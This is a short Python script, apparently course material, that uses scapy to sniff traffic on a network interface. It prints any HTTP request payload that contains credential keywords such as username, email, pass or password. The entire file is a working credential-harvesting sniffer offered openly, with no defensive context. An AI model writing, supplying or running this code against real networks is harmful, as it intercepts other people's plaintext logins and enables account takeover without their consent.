#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http    # here we have imported the http package from the scapy module


def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username', 'user', 'email', 'e-mail', "Email", "pass", "password", "login"]
            for keyword in keywords:
                if keyword in load:
                    print(load)

sniff("eth0")
